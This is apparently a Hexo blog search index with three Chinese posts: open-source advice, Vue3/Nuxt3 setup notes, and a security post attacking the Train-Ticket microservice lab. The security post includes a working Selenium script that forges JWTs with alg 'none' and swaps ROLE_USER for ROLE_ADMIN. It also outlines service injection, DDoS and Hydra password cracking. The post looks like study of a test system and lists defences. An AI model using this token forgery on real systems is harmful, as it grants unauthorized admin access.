<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>开源的第一步</title>
    <link href="/2023/03/24/%E5%BC%80%E6%BA%90%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AD%A5/"/>
    <url>/2023/03/24/%E5%BC%80%E6%BA%90%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AD%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="关于开源"><a href="#关于开源" class="headerlink" title="关于开源"></a>关于开源</h1><p>今天腾讯面试，有幸和一位<a href="https://github.com/overtrue">开源大佬</a>进行了接近一个小时的面试，学习到了很多东西</p><p>这次面试与之前参加的面试都不同，面试官并没有问很多基础知识，也就是八股文，而是每一个问题都直击底层或者实际应用场景。</p><p>如果平常开发经验不足，很容易手忙脚乱。而且考察的并不只是后端知识，还有很多前后端交互的知识。</p><p>今天受益匪浅，最后大佬还分享了很多有关开源的经验。</p><p>我想记录下这不平凡的一天，以及大佬教给我的一些学习与开源经验</p><ul><li>开源方面：<ul><li>从日常开发需求入手，比如平常使用到的第三方库与中间件，去发现其中存在的问题以及可以改善的点，提出Issue</li><li>在提出Issue的过程中，加深对该中间件的理解，尝试着去提出PR</li><li>以日常需求为主做开源，而不是为了开源而开源</li><li>一旦开始做开源，就坚持维护下去，即使只有自己在使用</li><li>尽可能地提升自己在开源社区的影响力，帮助他人解决问题</li></ul></li><li>学习方面：<ul><li>深入理解框架的底层原理，而不是停留在用的阶段</li><li>深入学习协议的底层</li></ul></li></ul><p>之前自己一直想着做开源，但是始终找不到一个很好的切入点。今天听了大佬经验分享之后，感觉醍醐灌顶。</p><p>从入门后端开发到现在，也已经有一年半的时间了，感觉是时候去思考如何将日常的需求与开源结合在一起，塑造自己的开源价值。</p><p>我想从自己平常经常使用到的框架或日常需求入手，逐渐地学习开源，慢慢进步，希望一年后能看到变化！</p>]]></content>
    
    
    <categories>
      
      <category>日常总结</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Web安全漏洞</title>
    <link href="/2023/02/06/Web%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/02/06/Web%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="Web安全漏洞"><a href="#Web安全漏洞" class="headerlink" title="Web安全漏洞"></a>Web安全漏洞</h1><h2 id="1-常见Web安全漏洞"><a href="#1-常见Web安全漏洞" class="headerlink" title="1. 常见Web安全漏洞"></a>1. 常见Web安全漏洞</h2><ol><li><p>篡改Token校验机制</p><ul><li><p>措施：</p><ol><li>从前端网站中获取Token，并通过base64解密得到JSON字符串</li><li>从JSON字符串中查看是否有敏感信息</li><li>暴力破解Token，得到Token的密钥，反向生成新的Token</li></ol></li><li><p>举例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JWTProvider</span> &#123;<br><span class="hljs-comment">// 密钥过于明显，显式地写在代码中。这种安全漏洞需要通过代码检测工具提前检测。</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;secret&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-variable">validityInMilliseconds</span> <span class="hljs-operator">=</span> <span class="hljs-number">3600000</span>;<br><br>    <span class="hljs-meta">@PostConstruct</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        secretKey = Base64.getEncoder().encodeToString(secretKey.getBytes());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">createToken</span><span class="hljs-params">(User user)</span> &#123;<br><br>        <span class="hljs-type">Claims</span> <span class="hljs-variable">claims</span> <span class="hljs-operator">=</span> Jwts.claims().setSubject(user.getUsername());<br>        <span class="hljs-comment">// 用户所属的角色信息过于敏感，猜测可通过暴力破解进行篡改</span><br>        claims.put(InfoConstant.ROLES, user.getRoles()); <br>        claims.put(InfoConstant.ID, user.getUserId());<br><br>        <span class="hljs-type">Date</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br>        <span class="hljs-type">Date</span> <span class="hljs-variable">validate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(now.getTime() + validityInMilliseconds);<br><br>        <span class="hljs-keyword">return</span> Jwts.builder()<br>                .setClaims(claims)<br>                .setIssuedAt(now)<br>                .setExpiration(validate)<br>                .signWith(SignatureAlgorithm.HS256, secretKey)<br>                .compact();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>造成的问题：</p><ul><li>攻击者基本可以获得系统的所有操作权限</li></ul></li><li><p>预防或解决方案：</p><ul><li>检测Token校验的代码</li></ul></li></ul></li><li><p>往Nacos恶意注入微服务</p><ul><li><p>措施：</p><ol><li>需要获取到对应微服务系统Nacos所在的服务器地址、账号与密码（可尝试使用默认密码）</li><li>新创建一个SpringBoot项目，配置对应的Nacos。启动该项目，即可注册成功。</li></ol></li><li><p>造成的问题：</p><ul><li>从内部攻击其它微服务而不被管理者察觉</li></ul></li><li><p>预防或解决方案：</p><ul><li><p>确保Nacos的账号与密码不泄漏</p></li><li><p>确保Nacos服务器地址不泄漏</p></li><li><p>自动检测配置文件中有关Nacos的配置信息</p></li><li><p>在向Nacos注册服务时，记录注册用户的IP地址，做到有效溯源</p></li></ul></li></ul></li><li><p>配置文件中误填了服务器地址、</p><p>数据库地址、数据库账号与密码等</p><ul><li><p>造成的问题：</p><ul><li>借助服务器恶意挖矿、删除数据库进行敲诈勒索</li></ul></li><li><p>预防或解决方案：</p><ul><li>自动检测配置文件是否存在敏感信息</li></ul></li></ul></li><li><p>接口泄漏，攻击者从浏览器的路由路径猜测出对应的后端接口地址</p><p>方法一：</p><ol><li>通过自动化脚本点击网站的各个页面，收集路径信息</li><li>通过自动化脚本，拼接收集到的路径信息，以Get&#x2F;Post方式向目标服务器发送请求。</li><li>从请求的Response中过滤出收到正确响应的请求 -&gt; 攻击切入点<ul><li>正确响应指：得到正确的数据、没有被权限系统拦截、无常规报错</li></ul></li></ol><p>方法二：</p><ol><li>通过网页控制台过滤Network请求，即后端请求，收集信息</li><li>向已收集的接口发送海量请求，若服务未做限流，将直接击穿服务器</li></ol></li><li><p>DDos攻击</p><ul><li><p>很难通过人为的监测进行避免 或 从代码层面进行预防，一般情况只能购买DDos高防</p></li><li><p>统计模型和机器学习算法(例如神经网络，决策树和近邻算法)可用于分析网络流量并将流量模式分类为正常或DDoS攻击。你还可以搜索其他网络性能因素中的异常，例如设备CPU利用率或带宽使用情况。</p></li><li><p>检测异常ip，从请求入口进行封杀，但是一般DDos请求是无特征的，所以很难有十足把握确定请求是恶意请求</p></li><li><p>通过CDN将网站的静态内容分发到多个服务器，用户就近访问，提高速度。此时不可泄漏服务器源地址，否则前功尽弃</p></li></ul></li><li><p>安全接口校验降级</p><ol><li>Train-Ticket每个微服务下，对应有SecurityConfig配置类</li><li>更改SecurityConfig配置类中的路径匹配角色校验代码，从管理员访问接口降级为任何人可访问的接口</li><li>结合接口探测方式，即可访问成功</li></ol></li><li><p>接口访问限流降级</p><ol><li>Train-Ticket对应的gateway-service中，配置了接口qps限流阈值</li><li>更改接口qps限流阈值或剔除限流代码</li><li>结合接口窥测与并发测试工具，可人为制造流量高峰，使服务瘫痪</li><li>Train-Ticket未对异常流量做进一步处理（黑名单检查机制）</li></ol></li><li><p>支付接口漏洞</p><p>该支付接口未做额外安全校验，管理员与普通用户均可访问</p><ol><li>Train-Ticket对应的payment-service中，存在addMoney接口</li><li>通过接口窥测方式获取到相应的接口路径</li><li>通过普通用户登陆得到Token</li><li>构造请求体，发送请求，实现增加金额</li></ol></li><li><p>以服务注入形式进行攻击</p><ol><li>通过SpringBoot注册新的微服务到Train-Ticket中</li><li>在新服务的内部创建新的接口，通过RestTemplete构造Http请求，发起RPC远程调用，调用其他微服务</li></ol></li><li><p>脚本批量注册用户：薅羊毛</p><ol><li>Train-Ticket对应的auth-service中，存在createDefaultUser接口，管理员可以访问</li><li>通过破解Token得到管理员权限</li><li>用Python构建Http请求脚本以及用户信息，构造请求，访问该接口</li></ol></li><li><p>DDos攻击</p><ol><li><a href="https://github.com/Ha3MrX/DDos-Attack">https://github.com/Ha3MrX/DDos-Attack</a></li><li>通过该脚本发起DDos攻击，监控服务的内存、CPU、流量等指标</li></ol></li><li><p>XSS攻击</p><ol><li>各类XSS攻击脚本 <a href="https://github.com/boku7/XSS-Clientside-Attacks">https://github.com/boku7/XSS-Clientside-Attacks</a></li><li>反射性XSS攻击：在前端代码中找到输入框的部分，尝试输入脚本</li></ol></li><li><p>Python爬虫窃取用户信息</p></li><li><p>服务器密码破解</p><ol><li>通过Crunch和rtgen工具生成密码字典</li><li>通过Hydra和Medusa工具暴力破解服务器密码</li></ol></li></ol><h2 id="2-JSON-Web-Token"><a href="#2-JSON-Web-Token" class="headerlink" title="2. JSON Web Token"></a>2. JSON Web Token</h2><p>JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;姓名&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;张三&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;角色&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;管理员&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;到期时间&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2018年7月1日0点0分&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名。</p><p>userID username role</p><p>role &#x3D; user user</p><p>role &#x3D; admin</p><p><img src="https://www.wangbase.com/blogimg/asset/201807/bg2018072304.jpg" alt="img"></p><p>JWT由三个部分组成：</p><ul><li>Header（头部）</li><li>Payload（负载）</li><li>Signature（签名）</li></ul><p><img src="https://www.wangbase.com/blogimg/asset/201807/bg2018072303.jpg" alt="img"></p><h3 id="2-1-Header"><a href="#2-1-Header" class="headerlink" title="2.1 Header"></a>2.1 Header</h3><p>Header 部分是一个 JSON 对象，描述 JWT 的元数据，通常是下面的样子。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JWT&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>上面代码中，<code>alg</code>属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；<code>typ</code>属性表示这个令牌（token）的类型（type），JWT 令牌统一写为<code>JWT</code>。</p><h3 id="2-2-Payload"><a href="#2-2-Payload" class="headerlink" title="2.2 Payload"></a>2.2 Payload</h3><p>Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。</p><ul><li>iss (issuer)：签发人</li><li>exp (expiration time)：过期时间</li><li>sub (subject)：主题</li><li>aud (audience)：受众</li><li>nbf (Not Before)：生效时间</li><li>iat (Issued At)：签发时间</li><li>jti (JWT ID)：编号</li></ul><p>定义私有字段</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1234567890&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;John Doe&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>注意，JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。</p><p>这个 JSON 对象也要使用 Base64URL 算法转成字符串。</p><h3 id="2-3-Signature"><a href="#2-3-Signature" class="headerlink" title="2.3 Signature"></a>2.3 Signature</h3><p>Signature 部分是对前两部分的签名，防止数据篡改。</p><p>首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lisp">HMACSHA256(<br>  <span class="hljs-name">base64UrlEncode</span>(<span class="hljs-name">header</span>) + <span class="hljs-string">&quot;.&quot;</span> +<br>  base64UrlEncode(<span class="hljs-name">payload</span>),<br>  secret)<br></code></pre></td></tr></table></figure><p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（<code>.</code>）分隔，就可以返回给用户。</p><h3 id="2-4-具体用法"><a href="#2-4-具体用法" class="headerlink" title="2.4 具体用法"></a>2.4 具体用法</h3><p>存储在浏览器的LocalStorage中</p><p>当前端发送的请求需要Token时，将其携带在请求头Authorization字段里</p><h3 id="2-5-破解方式"><a href="#2-5-破解方式" class="headerlink" title="2.5 破解方式"></a>2.5 破解方式</h3><h4 id="2-5-1-降级加密"><a href="#2-5-1-降级加密" class="headerlink" title="2.5.1 降级加密"></a>2.5.1 降级加密</h4><p>现在大多数应用使用的算法方案都采用 RSA 非对称加密，server 端保存私钥，用来签发 jwt，对传回来的 jwt 使用公钥解密验证。</p><p>碰到这种情况，我们可以修改 alg 为 HS256 对称加密算法，然后使用我们可以获取到的公钥作为 key 进行签名加密，这样一来，当我们将 jwt 传给 server 端的时候，server 端因为默认使用的是公钥解密，而算法为修改后的 HS256 对称加密算法， 所以肯定可以正常解密解析，从而绕过了算法限制。</p><p>对于Train-Ticket项目，无需进行降级。其本身使用的便是HS256对称加密，只有一把公钥。</p><h4 id="2-5-2-暴力破解"><a href="#2-5-2-暴力破解" class="headerlink" title="2.5.2 暴力破解"></a>2.5.2 暴力破解</h4><p>适用于HS256对称加密</p><p>从LocalStorage中获取Token，通过Python脚本暴力破解，得到对应的公钥</p><h4 id="2-5-3-置空加密"><a href="#2-5-3-置空加密" class="headerlink" title="2.5.3 置空加密"></a>2.5.3 置空加密</h4><p>从LocalStorage中获取Token，通过Base64解密得到JSON字符串</p><p>将alg修改为none后，去掉JWT中的signature数据（仅剩header + ‘.’ + payload + ‘.’）然后提交到服务端即可</p><h2 id="3-Token置空破解"><a href="#3-Token置空破解" class="headerlink" title="3. Token置空破解"></a>3. Token置空破解</h2><p>Python脚本实现：用于自动化完成token破解与登陆</p><ol><li><p>引入selenium</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br></code></pre></td></tr></table></figure></li><li><p>创建全局的webdriver</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">wd = webdriver.Chrome()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 自动登陆并获取Token</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_token</span>(<span class="hljs-params">username, password</span>):<br>    <span class="hljs-keyword">global</span> wd<br>    wd.get(<span class="hljs-string">&quot;http://10.249.238.10/client_login.html&quot;</span>)<br>    alertObject = wd.switch_to.alert<br>    alertObject.accept()<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-comment"># wd.find_element(value=&quot;flow_preserve_login_email&quot;).send_keys(username)</span><br>    <span class="hljs-comment"># time.sleep(2)</span><br>    <span class="hljs-comment"># wd.find_element(value=&quot;flow_preserve_login_password&quot;).send_keys(password)</span><br>    <span class="hljs-comment"># time.sleep(2)</span><br>    wd.find_element(value=<span class="hljs-string">&quot;client_login_button&quot;</span>).click()<br>    time.sleep(<span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">return</span> wd.execute_script(<span class="hljs-string">&#x27;return sessionStorage.getItem(&quot;client_token&quot;)&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 破解Token篡改名字与权限</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_token</span>(<span class="hljs-params">token: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    ts = token.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>    json1 = base64.b64decode(ts[<span class="hljs-number">0</span>])<br>    json1 = <span class="hljs-built_in">str</span>(json1)<br>    json1 = json1.replace(<span class="hljs-string">&quot;HS256&quot;</span>, <span class="hljs-string">&quot;none&quot;</span>)<br>    <span class="hljs-comment"># print(ts[1])</span><br>    json2 = base64.b64decode(ts[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;==&quot;</span>)<br>    json2 = <span class="hljs-built_in">str</span>(json2)<br>    json2 = json2.replace(<span class="hljs-string">&quot;ROLE_USER&quot;</span>, <span class="hljs-string">&quot;ROLE_ADMIN&quot;</span>)<br>    json2 = json2.replace(<span class="hljs-string">&quot;fdse_microservice&quot;</span>, <span class="hljs-string">&quot;lty&quot;</span>)<br>    json1 = json1[json1.find(<span class="hljs-string">&#x27;&#123;&#x27;</span>):json1.find(<span class="hljs-string">&#x27;&#125;&#x27;</span>) + <span class="hljs-number">1</span>]<br>    json2 = json2[json2.find(<span class="hljs-string">&#x27;&#123;&#x27;</span>):json2.find(<span class="hljs-string">&#x27;&#125;&#x27;</span>) + <span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(json1)<br>    <span class="hljs-built_in">print</span>(json2)<br>    header = <span class="hljs-built_in">str</span>(base64.b64encode(json1.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)), <span class="hljs-string">&quot;utf-8&quot;</span>)<br>    payload = <span class="hljs-built_in">str</span>(base64.b64encode(json2.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)), <span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-built_in">print</span>(header + <span class="hljs-string">&#x27;.&#x27;</span> + payload + <span class="hljs-string">&#x27;.&#x27;</span> + ts[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">return</span> header + <span class="hljs-string">&#x27;.&#x27;</span> + payload + <span class="hljs-string">&#x27;.&#x27;</span> + ts[<span class="hljs-number">2</span>]<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 重新放置新的Token</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">put_token_normal</span>(<span class="hljs-params">token</span>):<br>    <span class="hljs-keyword">global</span> wd<br>    <span class="hljs-comment"># wd.get(&quot;http://10.249.238.10&quot;)</span><br>    wd.execute_script(<span class="hljs-string">&quot;sessionStorage.setItem(&#x27;client_name&#x27;, &#x27;lty&#x27;)&quot;</span>)<br>    wd.execute_script(<span class="hljs-string">&quot;sessionStorage.setItem(&#x27;client_token&#x27;, arguments[0])&quot;</span>, token)<br>    wd.refresh()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 放置Token到Admin页面</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">put_token_admin</span>(<span class="hljs-params">token</span>):<br>    <span class="hljs-keyword">global</span> wd_admin<br>    wd_admin.get(<span class="hljs-string">&quot;http://10.249.238.10/adminlogin.html&quot;</span>)<br>    wd_admin.execute_script(<span class="hljs-string">&quot;sessionStorage.setItem(&#x27;admin_name&#x27;, &#x27;lty&#x27;)&quot;</span>)<br>    wd_admin.execute_script(<span class="hljs-string">&quot;sessionStorage.setItem(&#x27;admin_token&#x27;, arguments[0])&quot;</span>, token)<br>    wd_admin.get(<span class="hljs-string">&quot;http://10.249.238.10/admin.html&quot;</span>)<br>    <span class="hljs-comment"># wd_admin.refresh()</span><br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Token</tag>
      
      <tag>Web安全</tag>
      
      <tag>Selenium</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue3 + Nuxt3 项目笔记</title>
    <link href="/2023/01/30/Vue3-Nuxt3-%E9%A1%B9%E7%9B%AE%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/01/30/Vue3-Nuxt3-%E9%A1%B9%E7%9B%AE%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Vue3-Nuxt3在线教育项目笔记"><a href="#Vue3-Nuxt3在线教育项目笔记" class="headerlink" title="Vue3+Nuxt3在线教育项目笔记"></a>Vue3+Nuxt3在线教育项目笔记</h1><h2 id="1-项目初始化"><a href="#1-项目初始化" class="headerlink" title="1. 项目初始化"></a>1. 项目初始化</h2><h3 id="1-1-引入Nuxt3"><a href="#1-1-引入Nuxt3" class="headerlink" title="1.1 引入Nuxt3"></a>1.1 引入Nuxt3</h3><p>初始化项目</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">npx nuxi init nuxt-edu<br>npm <span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><p>运行项目</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yarn dev</span><br></code></pre></td></tr></table></figure><h3 id="1-2-引入Naive-UI"><a href="#1-2-引入Naive-UI" class="headerlink" title="1.2 引入Naive-UI"></a>1.2 引入Naive-UI</h3><p>参考官方文档服务端渲染SSR引入流程</p><ol><li><p>安装 <code>naive-ui</code> 和 <code>@css-render/vue3-ssr</code></p></li><li><p>在 <code>nuxt.config.ts</code> 增添下列配置</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// https://v3.nuxtjs.org/api/configuration/nuxt.config</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineNuxtConfig</span>(&#123;<br>  <span class="hljs-attr">build</span>: &#123;<br>    <span class="hljs-attr">transpile</span>:<br>      process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span><br>        ? [<br>            <span class="hljs-string">&#x27;naive-ui&#x27;</span>,<br>            <span class="hljs-string">&#x27;vueuc&#x27;</span>,<br>            <span class="hljs-string">&#x27;@css-render/vue3-ssr&#x27;</span>,<br>            <span class="hljs-string">&#x27;@juggle/resize-observer&#x27;</span><br>          ]<br>        : [<span class="hljs-string">&#x27;@juggle/resize-observer&#x27;</span>]<br>  &#125;,<br>  <span class="hljs-attr">vite</span>: &#123;<br>    <span class="hljs-attr">optimizeDeps</span>: &#123;<br>      <span class="hljs-attr">include</span>:<br>        process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;development&#x27;</span><br>          ? [<span class="hljs-string">&#x27;naive-ui&#x27;</span>, <span class="hljs-string">&#x27;vueuc&#x27;</span>, <span class="hljs-string">&#x27;date-fns-tz/esm/formatInTimeZone&#x27;</span>]<br>          : []<br>    &#125;<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>在 Nuxt 项目的 <code>plugins</code> 文件夹增加这个<a href="https://github.com/07akioni/naive-ui-nuxt-demo/blob/main/plugins/naive-ui.ts">插件</a></p></li></ol><h3 id="1-3-引入Windi-CSS"><a href="#1-3-引入Windi-CSS" class="headerlink" title="1.3 引入Windi CSS"></a>1.3 引入Windi CSS</h3><ol><li><p>安装</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">yarn <span class="hljs-built_in">add</span> nuxt-windicss -D<br></code></pre></td></tr></table></figure></li><li><p>在 <code>nuxt.config.ts</code> 增添下列配置</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">buildModules</span>: [<br>    <span class="hljs-string">&#x27;nuxt-windicss&#x27;</span>,<br>  ],<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="1-4-自定义全局错误页面"><a href="#1-4-自定义全局错误页面" class="headerlink" title="1.4 自定义全局错误页面"></a>1.4 自定义全局错误页面</h3><p>从naive-ui中复制错误模板页，拷贝到根目录的error.vue页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class=&quot;pt-[80px]&quot;&gt;<br>    &lt;n-result status=&quot;500&quot; title=&quot;错误提示&quot; :description=&quot;error.message&quot;&gt;<br>      &lt;template #footer&gt;<br>        &lt;n-button @click=&quot;handleError&quot;&gt;回到首页&lt;/n-button&gt;<br>      &lt;/template&gt;<br>    &lt;/n-result&gt;<br>  &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script setup&gt;<br>import &#123;<br>  NResult,<br>  NButton<br>&#125; from &#x27;naive-ui&#x27;<br>const props = defineProps(&#123;<br>  error: Object<br>&#125;)<br><br>const handleError = () =&gt; clearError(&#123; redirect: &#x27;/&#x27; 